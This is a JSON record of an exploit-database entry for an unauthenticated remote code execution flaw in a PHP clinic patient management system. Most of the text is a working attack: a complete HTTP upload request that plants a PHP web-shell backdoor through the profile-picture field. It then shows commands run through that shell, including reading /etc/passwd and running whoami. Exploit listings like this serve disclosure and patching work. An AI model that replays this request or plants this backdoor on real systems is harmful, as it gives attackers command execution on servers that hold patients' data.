{"source": "https://www.exploit-db.com/exploits/51779", "vulnName": "Clinic's Patient Management System 1.0 - Unauthenticated RCE", "vulnEDBID": "51779", "vulnCVE": "N/A", "author": "O\u011eULCAN HAMI G\u00dcL", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-05", "vulnContent": "# Exploit Title: Clinic's Patient Management System 1.0 - Unauthenticated RCE\n# Date: 07.10.2023\n# Exploit Author: O\u011fulcan Hami G\u00fcl\n# Vendor Homepage: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code\n# Software Link: https://www.sourcecodester.com/download-code?nid=15453&title=Clinic%27s+Patient+Management+System+in+PHP%2FPDO+Free+Source+Code\n# Version: 1.0\n# Tested on: Windows 10\n\n## Unauthenticated users can access /pms/users.php address and they can upload malicious php file instead of profile picture image without any authentication.\n\nPOST /pms/users.php HTTP/1.1\n\nHost: 192.168.1.36\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate, br\n\nContent-Type: multipart/form-data; boundary=---------------------------421755697017784551042596452367\n\nContent-Length: 1054\n\nOrigin: http://192.168.1.36\n\nConnection: close\n\nReferer: http://192.168.1.36/pms/users.php\n\nUpgrade-Insecure-Requests: 1\n\n\n\n-----------------------------421755697017784551042596452367\n\nContent-Disposition: form-data; name=\"display_name\"\n\n\n\nsefa7\n\n-----------------------------421755697017784551042596452367\n\nContent-Disposition: form-data; name=\"user_name\"\n\n\n\nsefa7\n\n-----------------------------421755697017784551042596452367\n\nContent-Disposition: form-data; name=\"password\"\n\n\n\nsefa7\n\n-----------------------------421755697017784551042596452367\n\nContent-Disposition: form-data; name=\"profile_picture\"; filename=\"simple-backdoor.php\"\n\nContent-Type: application/x-php\n\n\n\n<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->\n\n<?php\n\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n        echo \"</pre>\";\n        die;\n}\n\n?>\n\nUsage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\n\n<!--    http://michaeldaw.org   2006    -->\n\n\n-----------------------------421755697017784551042596452367\n\nContent-Disposition: form-data; name=\"save_user\"\n\n\n\n\n\n-----------------------------421755697017784551042596452367--\n\n\n## After the file upload request sent by attacker, Application adds a random number to the beginning of the file to be uploaded. Malicious file can be seen under the path /pms/users.php without any authentication.\n\n## With the request http://192.168.1.36/pms/user_images/1696676940simple-backdoor.php?cmd=whoami the attacker can execute arbitrary command on the application server.\n            "}